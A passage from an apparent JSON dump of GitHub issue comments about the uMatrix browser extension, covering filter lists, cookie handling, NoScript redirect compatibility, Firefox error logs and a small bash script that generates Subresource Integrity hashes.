me\nhttps://raw.github.com/reek/anti-adblock-killer/master/anti-adblock-killer-filters.txt\nhttps://easylist-downloads.adblockplus.org/easyprivacy.txt\nhttps://easylist-downloads.adblockplus.org/easylist_noelemhide.txt\nhttps://easylist-downloads.adblockplus.org/easylist.txt\nhttps://raw.githubusercontent.com/reek/anti-adblock-killer/master/anti-adblock-killer-filters.txt\nhttps://raw.githubusercontent.com/gorhill/uBlock/master/assets/ublock/badware.txt\nhttps://raw.githubusercontent.com/gorhill/uBlock/master/assets/ublock/filters.txt\nhttps://raw.githubusercontent.com/gorhill/uBlock/master/assets/ublock/privacy.txt\nhttps://raw.githubusercontent.com/gorhill/uBlock/master/assets/ublock/unbreak.txt\n. @CrisBRM commented on Feb 20, 2016, 1:03 AM GMT+5:30:\nhttps://github.com/gorhill/uMatrix/wiki\nAlso, reported.\n\nI have already seen that it didn't have my answers that's the reason i am asking \n. @CrisBRM commented on Feb 20, 2016, 1:07 AM GMT+5:30:\n\nGorhill should have just blocked you from accessing the bug tracker.\n\nI Can make another account easily...i just want want some answers if i din't get the answer i will not go from here\n. @CrisBRM commented on Feb 20, 2016, 1:07 AM GMT+5:30:\n\nGorhill should have just blocked you from accessing the bug tracker.\n\nIts the Developer fault entirely. if he just answered my question on forum I would have never come here to ask the question again \n. ",
    "ethus3h": "@Droyk if you expect people to be on hand to answer your questions all the time, maybe you should be using an app that has a support contract. Duh.\n. ",
    "vgturtle127": "@Droyk \n1. uMatrix already has a Wiki, but you can also check the docs directory for more information.\n2. There will always be more ads, and nothing will block all of them.\n3. That depends on many factors, like what kind of system you are running, web browser you are using, websites you visit, and other factors. Nobody can tell you exact numbers, but you should be fine, it is probably something else on your computer slowing things down (extensions, antivirus, etc.).\n4. uMatrix isn't really meant to be used like that, therefore the element picker doesn't make a whole lot of sense.\n5. It sounds like you should uninstall uMatrix and just use uBlock and call it a day.\n6. Again, my recommendation would be to just use uBlock and remove uMatrix. No offense, but I think uMatrix is a little too in-depth and complex for you to use if you browse a lot.\nAlso, based on how the other developers are reacting, I would say that you need to try and be more patient and perhaps more respectful since this is given to you for free and Gorhill works on it in his spare time.\nI don't know where you are from, but we would appreciate it if you would try and learn more etiquette and manners for English speakers.\nThis isn't meant to offend you, I give this same advice to anybody trying to attain help from another country or region.\n. ",
    "Hout": "@vgturtle127 Respect! :+1:\n. ",
    "foresto": "+1\nIn fact, I came here to write up a feature request for this very thing. I'm glad someone beat me to it.\nThis situation comes up many times per day for me, because there are now so many sites that use track-and-redirect URLs instead of directly linking to the URL that the user intends to reach. I appreciate that uMatrix intercepts the trackers, but the fact that it currently just blocks me from reaching my destination is pretty frustrating, especially when the final target URL is readily available, embedded in the query parameters of the blocked URL. My current solution is to copy the blocked URL, navigate to a URL decoder site, paste the copied URL, run the decoder, highlight the part that is the link I wanted in the first place, and copy it back into my browser. Sometimes I'm just too tired for that nonsense.\nResult: uMatrix effectively creates a denial of service when it could instead be helping me.\nHere's an example from just a few minutes ago:\nuMatrix has prevented the following page from loading:\nhttp://www.tkqlhce.com/click-552179-10728762?SID=ASDFWECDSDR2d0FBQUJ&URL=http%3A%2F%2Fwww.columbia.com%2Fmens-northern-pass-fleece-jacket-1621171.html%3F\n\nIt would be so much better if uMatrix plucked out that target URL and let me click on through without the tracker.. I'm using cleanlinks. It doesn't solve this problem, although perhaps it could be used as a guide for a uMatrix implementation.. ",
    "elypter": "there is an extension called cleanlinks that does this. in the element picker you can select something like \"||*logo.png\" which turns into \"logo.png$image\" but it only gets removed in the element picker. if you reload the site it doesnt work. those seem to use different filter engines\n. it would make sense in a greater \"per site settings\" management addon that manages everything from cookies, plugins, ads, site optimization, redirects and so on but such an addon unfortunately doesnt exist. if you find developers then tell them the idea.\n. unfortunately i dont think they will do such a thing. youre more likely to find someone developing for palemoon or vivaldi to implement this in their browsers. firefox has become way too big and rigid to incorporate new ideas\n. @Atavic\n\nThat will make ublock and umatrix very close to each other. I see many users using both, leaving ublock mostly untouched while refining blocks on umatrix for specific issues.\n\ntbh. i never really understood why both projects were split in the first place. the original name was a bit lame but i dont see why umatrix cannot be the \"advanced\" option of ublock. unless there will be an additional developer for ublock/umatrix i dont think gorhill wont find the time to implement any major features for umatrix. it seems to be fixed now. it would be cool if you could create a fork that merges all the pull requests gorhill declined. it's starting to become worth it and it would create a place where people could post other requests as well.. i havent tested it yet but here is a fork with some of the pull requests merged https://github.com/elypter/uMatrix\nit also merges a few changes for the user agent switcher that got removed just minutes ago. i have zero expierience with firefox addons. i just clicked through github and merged a few patches. the result doesnt work yet. i will change the readme if it becomes useable. i wished github was more helpful with that kind of stuff. this makes things a little more complicated syntax wise because then multiple ways of writing rules exist but it makes the list a lot smaller. what i think that would be even more effient if you go that route would be meta rules like \"all-except-cookies\" or \"video-frame\" which is basically a generic row that can be applied to any domain you like and that can be changed globally. if umatrix one day become more fine grained this could prove handy. they would be defined with a directive and can then be used like regular request types.. this would still have the same syntax. just more keywords for type. for example:\nyahoo.com search.yahoo.com except-cookies allow\nthis would allow every request on yahoo.com to search.yahoo.com except cookies\nfor this to work you would have to add a new directive:\ncustom-type: type-name type action\nfor example:\ncustom-type: except-cookie * allow\ncustom-type: except-cookie cookie block\nthis could even be expanded for a whole scope by adding destinations to the syntax. this way you could reuse a ruleset made for one website for another or make templates for general types of websites and only adjust whats different between them. for example to allow embedded youtube videos easily on a set of sites without having to allow google globally. this would also be useful to temporarily unbreak sites like suggested here(point 2) https://discourse.mozilla.org/t/support-umatrix/5131/34 and it could also be used to give the host lists a different default behavior\ntemplate: type-name des type action\nfor example:\ntemplate: except-cookie 1st-party * allow\ntemplate: except-cookie * cookie block\ntemplate: except-cookie 1st-party cookie block\ni dont know if it is really needed and its a big change but i think if that if the syntax should be extended this would be a good and flexible way.. to be fair it is a bug because the wiki is missing this info. ",
    "sha-265": "@gorhill url is irrelvent because it happens in all videos.\n@mbme you where right. Problem solved by disabling user agent spoofing. \nThanks.\n. ",
    "nSpecter": "Got it. Thanks.\n. ",
    "nazir-cz": "I recently switched from noscript to umatrix  and I also lack this feature...\n. ",
    "eromlige": "@Snapy @gorhill \nFair enough, thank you for the response. I still love uMatrix, and keep up the good work!\n. ",
    "towlie": "Oh I see. I middle clicked/ draged the link to a new tab. Just left-click shows the uddated list\n. Hm shall I reopen? Because this is a different behaviour compared to ublock.\n. ",
    "TriMoon": "@TeKett , LMAO !\nSorry but if you don't know how to use something you installed, why use it at all ?\nThe whole point of uMatrix is to block things, so the first reaction you should have had is to check the uMatrix setting for the page you're on when you get such a message.\nThat said,\nEither please remove the addresses in your screenshot and remove the screenshot of the final page to prevent not_asked_for advertisement.\n(Ads work for me like red flags for bulls, eg. makes me aggravated)\nedits:\n  1) Temporarily blocking images from cloud.githubusercontent.com using uMatrix\n  1) Blocked @TeKett due to adverts.. @gorhill  , instead of such a reply you could acknowledge it and flag it appropriately.\nThen when time comes, or others find a fix for it, you could patch it...\nIt will also prevent duplicate reports for this issue...\nThis kind of replies from you as the developer are just making users of this extension hostile..... This is just a sign that @gorhill will abondon this project and leave it to die...\nWhat other acceptable reason would there be to deny bug reporting on  public project?\nMaybe someone should fork this project and manage it better...\n@gorhill , I know you hate bug reports this way, so here is more:\nusing Firefox Nightly 55.0a1 (2017-06-05) (64-bit)\n- Your web extension version 1.0.1b1 is not able to present any configuration or log window.\n- Your web extension versions can't cloud-save/load settings. The button does absolutely nothing.... @gorhill I understand ofcourse, Thanks in case you get time to it in future \ud83d\ude38 \n@uBlock-user It wasn't a permission issue as you described \ud83d\udc45 , but thanks for the effort.. @uBlock-user See the answer of @gorhill \ud83d\ude09 . Interesting, can you supply the link under mobile website of the addons?\nBecause i couldn't find it when i posted this tread and tried by using the desktop site.... @a90c , thanks but i'm not touching yandex browser \ud83d\udc45 \n(or anyother browser made by any search engine including google, due to the fact that they will ALWAYS do as much as technically possible to gather info THEY want...\nSo i'll stick with Firefox \ud83d\ude09 . Ok, @gorhill  no need to get snappy on me....\nIf you want a debuggers detailed steps then i can provide it (Just ask for more details).\nHere goes:\n* Preperation:\n  1. Setup Apache2 to answer on localhost IPv4 + IPv6, (see the Apache2 documentation)\n  1. Create the index.html that will be served by it using any editor of your choice.\n  1. Inside the index make use of stylesheet(s) and script(s) both in the head and body of the html\n  1. Make sure you use SRI on these stylesheet(s) and script(s).\n     * I made use of the command mentioned on https://www.srihash.org/.\n     * Using that info I created the following script to ease generation of the needed hashes: (naming it sri.sh)\n```bash\n!/usr/bin/env bash\nv1.0 .\n\n(C) 2017+ \u00a9TriMoon\u2122\nhttps://github.com/TriMoon\nLicense: BY-NC 4.0\nThis work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.\nhttps://creativecommons.org/licenses/by-nc/4.0/\nSee:\nhttps://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\nhttps://www.srihash.org/\nif test $# -lt 1; then\n    printf \"%b\\n\" \\\n        \"Usage: $(basename $0)   \\n\" \\\n        \"Where  can be 256, 384, and 512\" \\\n        \"Default being 384\"\nelse\n    file=\"$1\"\n    hash=\"${2:-384}\"\n    sri=$(openssl dgst -sha${hash} -binary \"${file}\" | openssl base64 -A)\n    printf \"%s\\n\" \\\n        \"sha${hash}-${sri}\"\nfi\n\nEditor modelines  -  https://www.wireshark.org/tools/modelines.html\n\nLocal variables:\nc-basic-offset: 4\ntab-width: 4\nindent-tabs-mode: t\nEnd:\n\nvi: set shiftwidth=4 tabstop=4 noexpandtab:\n:indentSize=4:tabSize=4:noTabs=false:\n\n```\n\nTesting uMatrix:\nMake sure apache2 is running using the Preperation steps mentioned above.\nNow access the webpage using [::1]/ in the urlbar.\nOpen the Webdeveloper window while looking at this page.\nInteresting tabs for our purpose are console and network.\n\n\nThe stylesheet(s) and script(s) are not in use at this moment, due to an error mentioned in the console. (At least on my side.)In my case i saw the following line in the console, no idea why because the command to generate the hashes is correct:None of the \u201csha512\u201d hashes in the integrity attribute match the content of the subresource.\nI made use of 3 hashes per integrity tag 256 + 384 + 512 just to be safe in case the browser didn't support one or the other.\n\n\nClick the uMatrix icon to open the interface of uMatrix.\nClick in the top row inside the red \"all\" column on the left.\nThis will add a temporary [::1] * * allow rule to uMatrix.\n\n\nClick the \"Reload page\" icon inside the uMatrix interface.\nThis time the stylesheet(s) and script(s) will be in use for the viewed page.\nThere will not be any error as mentioned above in the console.\n\n\n\n\nSo which bug(s) is/are going on here?\n  1. SRI related:\n     1. [ ] Firefox does not properly support SRI.(shows supported for me)\n     1. [ ] The openssl on debian9 generates faulty hashes for use in SRI.(seems my proxy alters content on my side, see my next comment below)\n  1. uMatrix related:\n     1. [x] uMatrix bypasses SRI checks in above setting.. Another observation related to this issue: (from my side as a mind-note)\n  * Seems i'm not getting the None of the \u201csha512\u201d hashes in the integrity attribute match the content of the subresource. error when i disable proxy usage.\n  * So i need to check why my privoxy config alters those retrieved contents.... Just confirming i don't have any issues when visiting the link in OP using FF-Nightly 59.0a1 (20171223100103). ",
    "Hackerpcs": "May I ask why is it declined?\n. It could save a few misclicks but I fully respect your opinion.\n. ",
    "Chaz6": "That bulletpoint should be a \"*\" (thanks, Markdown).\n. See also https://github.com/gorhill/uMatrix/issues/515\n. ",
    "kwill": "Found it! https://github.com/gorhill/httpswitchboard/wiki/How-to-use-HTTP-Switchboard:-Two-opposing-views#the-allow-allblock-exceptionally-approach\n. ",
    "semente": "I would use uMatrix referrer spoofing because I don't know how it works in Privacy Badger (do you?). If it is the same behavior I will do that. Otherwise I think I should report Privacy Badger to add a option to disable this from their extension.\n. For those with the same problem, you can check the following issue pages on Privacy Badger project: \nhttps://github.com/EFForg/privacybadger/issues/855\nhttps://github.com/EFForg/privacybadger/issues/1314. ",
    "rajeshsub": "+1 for this suggestion\n. ",
    "itschytoo": "Thank you both. Sorry for the bother!\n. ",
    "kawiv2k": "Oh, I see. Very good. I thought the all cell was the same as whitelisting everything. I suppose I need to dig into the documentation a little more. I also want to automatically deny social media when I'm surfing, which I think I saw was possible using the rules editor, but I haven't looked at the details yet for allowing on the rare time I actually look at a facebook page vs just all of the sites that think they need to link it.\nOK then, this case is closed, nothing to see here, move along.....\n. Nice, thanks!\n. ",
    "N4melessGitter": "yeah that would be another way to achieve the same, with a bit more control.\nBut just in case there are other \"about-scheme\"-s now or in the future which connect to blocked domains, it's not the best solution IMO.\nI would still prefer replacing matrix-off: about-scheme true with about-scheme * * allow,\nsince it's the closest replacement in behaviour AND filtering bad domains everywhere.\nAnd in only one line too. KISS\nIt's also possible to set this in Firefox to control \"about:addons\":\nuser_pref(\"extensions.webservice.discoverURL\", \"about:blank\");\nBut that \"clears\" the whole addons search content and only leaves the search bar.\n. lol, why would anyone want to block Warez/Torrent sites? xD\nThanks for the list though, I will definitely use some of them.\nWell, even that warez list could still be useful ;-)\n. Ok, on a more serious note - please don't add those lists @gorhill!\nI only added 2 of the lists and it nearly trippled the blocked domains in total.\nJust glancing over some of them, there were  f.e. dozens of subdomains for asstraffic18.com.\nI don't understand why they wouldn't just block the whole damn domain instead.\n@OP if you want those lists just add them to your own list, but I don't think it's necessary.\nIf you don't allow scripts even for 1st party, and considering you'll probably never come across 90+% of the domains in those lists, there's zero risk from not having those domains in the list, and it's just not worth the performance impact, no matter how small.\n. > But I thought it could be nice to have them available as standard options, ...\nI think that would just encourage people to enable those lists to be \"more secure\", while not allowing 1st-party scripts is simply the better and more secure solution with the best performance aswell.\n\n... particularly combined with #526\n\nThat would be a nice feature to have, if it can be done without much of a performance impact in a way that you suggested.\n\nif you visit a bittorrent site you get a message saying \"blocked by these lists: WRZ - Warez\"\n\nthat would never happen to me, so I can't comment on that any further ;-)\n\nIs there any performance impact to having lists available but not enabled?\n\nI don't think so, but I wrote above why I'm against it.\n\nI prefer to allow 1st-party scripts\n\nMost websites work just fine or at least good enough without scripts enabled.\nWith your setting I can understand that you may want to add as many blocklists as possible.\nBut you'll sacrifice safety for some more information, and will never be as safe as having a deny-all/allow-where-absolutely-necessary approach. Even with millions of domains blocked.\nSince uMatrix is only recommended for advanced users anyway, I think every user could find more lists for his/her liking in no time if they deem it necessary.\nWould you mind sharing how many blocked hostnames you currently have?\n. ",
    "Cerberus-tm": "@grumpygeek That's strange. For me, the icons of Pushbullet, Redirector, and Self-Destructing Cookies also disappear often after a browser restart. What is more, the add-ons also don't work at all when that happens! For example, I can't send anything through Pusbullet when that happens, nor receive anything. And Redirector doesn't redirect.\nSo you say this is a problem inherent in Firefox. Would there be any way to prevent this from happening manually, or some kind of work-around?\n. @grumpygeek Hey, I somehow never saw your reply. I'm glad to see that Crush Those Cookies was fixed. Do you still experience this issue? I must say I haven't seen it happen in a long while. Perhaps it stopped happening once I started to always force-close Firefox: that seems to have helped. And is the issue still present in Firefox 57, that you know? I'm still on an older version.. As to text being selectable, I hope that doesn't change! As mentioned, being able to select hosts can be highly useful in certain scenarios.. Update (from the Mozilla bug above): this issue has been fixed, and the fix will be implemented in FF 58 (or 59).. Interesting. So this isn't related to the other browser bug, where you can't block stuff 'behind the scenes' any more in FF 57+?. @Thorin-Oakenpants  Oh, I was about to post the bug. . I've posted the bug here:\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1433700\nI'm a total layman, so I may have reported it improperly. I've never reported a bug before.. @Thorin-Oakenpants All done! See above.. ",
    "Mikachu": "Well, it seems like I was wrong even though I tested for a few days before reporting; I just got redirected with default whitelist cookies on google.com... And this time it took 9 hours to break apparently.\n. Like I said, this happened when I had all cookies on all sites globally default to whitelisted, so youtube.com was already allowed to access my google.com cookies when I encountered the issue the final time. I also just checked that I don't have any relevant \"cookie block\" lines either.\n. ",
    "Jalkion": "I think I found the problem, when you got to youtube.com it wants to access your google cookies and when it doesn't find them because you have blocked access it just writes a new NID cookie which resets your preferences.\nSo just allow youtube.com to access your google.com cookies.\n. Yeah I forgot that part when I found out how to reproduce it.\nIf you open the uMatrix logger and filter by \"cookie google\" and go to youtube.com with cookie block on for google.com it should show this \n\nAlright so after more tinkering it only does it if you have frames allowed for google.com on youtube.com. if you block frames for it, it doesn't touch the NID cookie.\n. ",
    "Rimmer7": "The uMatrix logger overall is less useful and flexible than the uBlock logger.\n. @Atavic, currently the real reasons to use uBlock Origin together with uMatrix is uBO's ability to block specific individual scripts/images/etc as opposed to all scripts/images/whatnot from an entire domain (also element hiding, but I digress). Adding the ability to use external rulesets would in no way diminish this, as external rulesets would not add any such functionality to uMatrix.. @Atavic No. No there won't. At all.. I find that oddball issues like this are usually fixed by disabling Strict HTTPS or more rarely User Agent/Referrer Spoofing for the scope. You can change those settings for chase.com by clicking the three blue dots to the left of the padlock.. Things like recommended rulesets is something we the users should work on, so that gorhill can focus on getting actual work done.. ",
    "sheepdestroyer": "Running the RC with this fix since release, no pb. Is is still planned to port that fix to uBO?\n. ",
    "babyblue69": "All, one after the other one.\n....\nEverSync\nExt. Download manager tweak\nFacebook Disconnect\nFEBE\nGestionnaire de session\nT - Google Translator for Firefox\nSpeed Dial [FVD]\nStylish\nuBlock Origin\nWhatsApp Desktop\nWOT\n. Yes, I also made that.\nI made a screenshot jpg and png 1024x718 409k but \" Attach files\" do not want it, even the File was converted in PDF.\n. Thank ......\nEasy to close the post instead of solving the problem\nbrowser version    Fact \nublock version   >  (1.6.8)\nthese settings, these filter lists, these custom filters.   >   Fact\ndo this.\nopen this exact URL.   >   Fact    https://docs.google.com/spreadsheets/d/1o2jMQCxbto-fdEb7qGoIcesml6J7j7GF8tP_O7HDcQk/edit#gid=703121560\ndo this.\nobserve this.   >   Fact\nclick this.   >   Fact\nobserve such and such issue   >   Fact\nsee screenshot   >   Fact :\n\n. YES\n. Well, OK\nI am going to return on less good NoScript, but it works with everything sites\n. Anyway, thanks for your help.\nIf to find you the solution, made the I to know.\n. Uninstall, reinstall, reset (setting default) and there it works, \nthank you for the help(assistant) that you brought me,\ngood continuation.\nconcluding: with [docs.google.com/...] \nnot use option \"Modify the Identification of Web browser\" actived\n. ",
    "BeTmAsTeR": "what are the plans ? @gorhill \n. ",
    "hackademix": "Giorgio here.\nWhat kind of properties does uMatrix set on the channel?\nDepending on whether they're expected to be persisted across \"normal\" redirections (as it happens for nsIPropertyBag ones) we could either file (and possibly fix) a Mozilla Necko bug to make redirectTo() mimic more closely HTTP redirections, or uMatrix could use a ChannelEventSink to set them on the new, redirected channel.\nThere's actually a 3rd solution/work-around: if a proper fix in redirectTo() is considered too risky, NoScript itself could use its own old, pre-redirectTo() redirection emulation trickery to \"augment\" Necko with property copy...\n. That's expected, because NoScript uses this internal redirection to delay anti-CSRF protection processing until DNS resolution is complete to mitigate DNS rebinding attacks.\nAs I suggested earlier, the problem appears to be caused by\n1.  redirectTo() not copying the extra properties from the old channel to the new one (opposite to what happens for \"organic\" redirections) and\n2. http-on-opening-request never being called for any redirection (by design).\nAn easy work-around would be assigning your extra properties in http-on-modify-request, I guess.\n. > This also mean that any extension which relies on http-on-modify-request would have to implement such workaround just for the sake of working properly with NoScript specifically.\nNot quite. It just means that you should not modify requests (e.g. by adding headers or properties) in \"http-on-opening-request\": as the name suggests, the proper place is \"http-on-modify-request\".\nFurthermore, this bug is not triggered specifically by NoScript, but by any add-on (or Gecko internal code) which uses nsIHttpChannel.redirectTo() (and this is gonna be quite common in the brave new WebExtensions world, since webRequest's redirectUrl implementation does exactly that).\n. > > You should not modify requests (e.g. by adding headers or properties) in \"http-on-opening-request\"\n\nNeither uBlock or uMatrix do this. Headers are modified strictly at http-on-modify-request and/or http-on-examine-response time.\n\nMaybe I misunderstood the whole issue, then: do or do not your add-ons modify the request by adding custom properties in \"http-on-opening-request\"? If they actually do, please move that modification code in \"http-on-modify-request\".\n\nWith Chrome API, never does the use of redirection prevent onBeforeRequest from being properly fired to all listening extensions.\n\nIn facts, Firefox's onBeforeRequest implementation relies on \"http-on-modify-request\", not on \"http-on-opening-request\": therefore WebExtensions themselves will work just fine, but legacy add-ons which use http-on-opening-request will get confused by WebExtensions' redirections.\n\nI strongly believe that it is reasonable for an extension subscribing to http-on-opening-request to always be notified through http-on-opening-request for every new request.\n\nNo, i think it's not. The docs do not guarantee this, and discourage its usage unless you've got a very narrow use case for it:\n\nhttp-on-opening-request - Similar to http-on-modify-request, but called earlier (synchronously during the channel's asyncOpen() call), and some channel atttributes (proxyInfo) may be missing. Use only if your observer must be called before asyncOpen returns.\n\nAt any rate, http-on-opening-request observers are not notified for redirections, there's specific Necko code in nsHttpChannel.cpp preventing this, so if you need to process redirected channels just do not rely on that notification.\n. > Is \"sent before any TCP connection is made\" also true for Firefox's http-on-modify-request?\nYes, unless of course it's a previously established persistent connection (same host, Connection: Keep-Alive), which I'm pretty sure happens also for Chrome's onBeforeRequest, despite the ambiguous promise made by the doc (but I believe it's not relevant for our own use cases, is it?)\n. ",
    "davidhedlund": "@gorhill \n\nuBlock Origin (\"uBO\") and uMatrix must be considered incompatible with NoScript.\n\nABP can be used with NoScript without any problems.\n. ",
    "dmiranda12": "Sorry about that.  Chris is the name that appears in the wiki, I thought.\nI posted the same suff plus some google rules in the wilders security forum\nThanks.\nOn Sat, May 28, 2016 at 12:12 PM, Raymond Hill notifications@github.com\nwrote:\n\nClosed #556 https://github.com/gorhill/uMatrix/issues/556.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/556#event-675222464, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe/AStx5CgDqvw-GVL0JzQv7nW18ZQ3VK5Xks5qGFt7gaJpZM4IpF7Z\n.\n. \n",
    "PaulBags": "The details are that the extension does nothing in the chrome webstore, chrome.google.com. http://chrome.google.com, extension does nothing there. Cannot use uMatrix in the chrome webstore. I can't think of any other ways to say it, or any other details to add - i t   j u s t   d o e s n ' t   w o r k   o n   c h r o m e . g o o g l e . c o m.\n. Latest Chrome, 0.9.3.3, screenshot: http://iforce.co.nz/i/uppmbkel.wvp.png\n. ",
    "figvam": "Here are all umatrix entries from the startup log:\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 687: TypeError: win is null\nJavaScript strict warning: chrome://umatrix/content/js/cookies.js, line 499: ReferenceError: reference to undefined property vAPI.cookies\nJavaScript error: chrome://umatrix/content/js/cookies.js, line 499: TypeError: vAPI.cookies is undefined\nJavaScript error: chrome://umatrix/content/js/assets.js, line 131: TypeError: vAPI.lastError is not a function\nJavaScript error: chrome://umatrix/content/js/assets.js, line 131: TypeError: vAPI.lastError is not a function\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1400: TypeError: getTabBrowser(...) is null\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1400: TypeError: getTabBrowser(...) is null\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1400: TypeError: getTabBrowser(...) is null\n.....\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1400: TypeError: getTabBrowser(...) is null\nDocument chrome://umatrix/content/dashboard.html loaded successfully\nJavaScript strict warning: chrome://umatrix/content/js/messaging.js, line 586: ReferenceError: reference to undefined property vAPI.cloud\nJavaScript error: chrome://umatrix/content/js/messaging.js, line 586: TypeError: vAPI.cloud is undefined\n. Interesting. Looks like AMO still has 0.9.3.3?\nAnyway, updated to 0.9.3.5rc1 but no luck. The log follows:\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 687: TypeError: win is null\nJavaScript strict warning: chrome://umatrix/content/js/cookies.js, line 499: ReferenceError: reference to undefined property vAPI.cookies\nJavaScript error: chrome://umatrix/content/js/cookies.js, line 499: TypeError: vAPI.cookies is undefined\nJavaScript error: chrome://umatrix/content/js/assets.js, line 131: TypeError: vAPI.lastError is not a function\nJavaScript error: chrome://umatrix/content/js/assets.js, line 131: TypeError: vAPI.lastError is not a function\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1416: TypeError: getTabBrowser(...) is null\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1416: TypeError: getTabBrowser(...) is null\n....\nJavaScript error: chrome://umatrix/content/js/vapi-background.js, line 1416: TypeError: getTabBrowser(...) is null\nJavaScript strict warning: chrome://umatrix/content/js/vapi-background.js, line 896: ReferenceError: reference to undefined property details.popup\nDocument chrome://umatrix/content/dashboard.html loaded successfully\nJavaScript strict warning: chrome://umatrix/content/js/messaging.js, line 586: ReferenceError: reference to undefined property vAPI.cloud\nJavaScript error: chrome://umatrix/content/js/messaging.js, line 586: TypeError: vAPI.cloud is undefined\nDocument https://github.com/gorhill/uMatrix/issues/561 loaded successfully\nJavaScript error: chrome://umatrix/content/js/vapi-client.js, line 43: NS_ERROR_NOT_INITIALIZED: \nJavaScript error: chrome://umatrix/content/js/messaging.js, line 586: TypeError: vAPI.cloud is undefined\nJavaScript error: chrome://umatrix/content/js/vapi-client.js, line 43: NS_ERROR_NOT_INITIALIZED:\n. ",
    "byte-jra": "0.9.3.5rc1 user here - same story. Just wanted to say that I've become used to disabling and immediately re-enabling uMatrix (and another extension) after starting Seamonkey, else it won't work (or in uMatrix case load its settings).\n. @rheber You also need to allow githubusercontent.com in order to fully use GitHub. But a more thorough look at the matrix or the log should have told you so.\n. There's a \"colorblind\" option right in the first \"Settings\" panel.. https://github.com/gorhill/uMatrix/wiki/Cookies. 49. Because neither the browser nor uMatrix could know what content a certain iframe/script loads until it tries to. So it's inevitable to reload multiple times if content at the lower layers is blocked from executing.. 1) https://www.ghacks.net/2017/03/09/firefox-legacy-add-on-or-webextension-how-to-find-out/\n2) https://github.com/gorhill/uMatrix/releases\n3) all clear?\n(webext.xpi isn't default in AMO). ",
    "tx9191": "@crssi uMatrix doesn't block any cookie in the http responses(i.e. Response Cookies) sent from the websites, it blocks cookies by preventing the cookies data be sent to the website. So far uMatrix hasn't offered a way to block cookies on the reponse end. \nIt's common for a website to set new cookies for a browser when it find there is no cookie data in the http request from that browser, and that new cookies are very likely to overwrite the login information that is set earlier.\n@gorhill Unnecessarily browsing websites after login allows them establish a link between your browsing behaviour and you accounts. And deleting the cookies forces you to enter your passwords again when you need to login, which may give someone more chances to catch them on theirs route to the website servers when the communications are not encrypted.\nI think it's useful for umatrix to get the ability to  block the Response Cookies, allowing me to \"log in\"/\"log out\" by allow/block the cookies with just one click, without concern of entering password\n. My scenario: \n1.to log in a website to check if there is any new massage sent to my account.\n.\n2.After finishing the checking, I'd like to read some news or other stuff which don't require login and cookie on the same website. And I don't want the website to collect my browsing behaviour and link it to my account/e-mail/phonenumber or other information I store on that site. So I block the cookie for the site,along with 'Delete local storage content set by blocked hostnames' enabled, so that the website deem me as a new user to it. \n(Simply loging out doesn't do the trick as there's very likely to be some information for recognizing me in cookie even after logging out.)\n3.At the next time when I want to check message in my account, I revoke the cookie blocking for that site. Because the cookie that records the login information has been overwriten now, I have to enter my id/password again - in some cases I have to go through the boring 2-step login again, in some other cases I send my password in plain text over the internet several times a day.\n4.If uMatrix can block the Response Cookies to keep the cookies that contain my login information intact, I can simply revoke the blocking temporarily and the site will immediately treat me as a logged-in user without requiring my id/password again.\n. ",
    "Superbest": "@gorhill Out of curiosity, why did you decline this? Do you feel that 5 minute setting to be a sane default, or did you already have a different improvement planned?\n. ",
    "Celti": "Errors, shmerrors \u2014 mixed content can be a massive security risk and I would rather get an error (and either avoid or whitelist that site) rather than not be able to do anything about it.\n. > That was not your original issue. Browsers already block scripts from non-encrypted connections for content pulled from encrypted connections: a script http://example.com/script.js pulled from within https://example.com/index.html will not be allowed by a browser.\nI'm aware it was not my original issue, I was responding to @Atavic \u2014 and I'm a little confused,, now. If it's the case that such scripts are already blocked in the mixed-content case, then how is this toggle causing errors even a concern at all? One could cause those errors by disabling scripts on any given site, mixed content or not, and it's up to the user whether or not they want to deal with them, as with any sort of content-filtering extension, no?\n. ",
    "Vaesper": "I for one would love to have this feature. @Atavic you could just have the toggle globally off if you don't want to use it, so it wouldn't necessarily cause usability issues. Implementing a - rudimentary - IDS in uMatrix (what your suggestion essentially boils down to) is a bit out of scope for the extension imho (and far from a foolproof method anyway, with a huge potential for both false positives and false negatives).\n. ",
    "Forkest": "Oh, thanks! Probably clicked it accidentally. Sorry for the inconvenience.\n. ",
    "rieje": "I don't understand--so if I have that option checked and some of the cookies are enabled while the rest are disabled under the cookies column, you said they are deleted, implying that some dom data is stored at some point (which allows some sites that require it to function). So when does it delete the dom storage? Or do you mean that the dom storage is completely disabled and no dom data is stored ever?\n. Last question--is dom storage cleared along with cookies at the specified interval that cookies are deleted?\n. ",
    "Acecool": "It is looking promising, but you can't blocks certain elements all the time... IE the one I'm trying to defeat is a very annoying system.. I've beaten all the old ones, now this one has a random div class ( Initial class-name is static so I tried removing that but Tampermonkey doesn't load quick enough for it to remove it ) and I rewrote the functions, classes, etc.. but as noted, tm doesn't load quick enough.\nAlso, it doesn't seem to support regex for blocking. I have a few elements I need to block which always follow a specific pattern ( div class starts static but hooked into 10 or so events plus timers, etc.. re-adds and renames it to a random 15 to 25 alphanumeric character string ), and some use link_[0-9]+ as the class-name but I can't target and adding for each specific link ( each link has its own id, so it isn't just 1, 2, 3, etc... )..\nBut, it does seem to be a lot more effective that Adblock plus.. Cheers.\n. ",
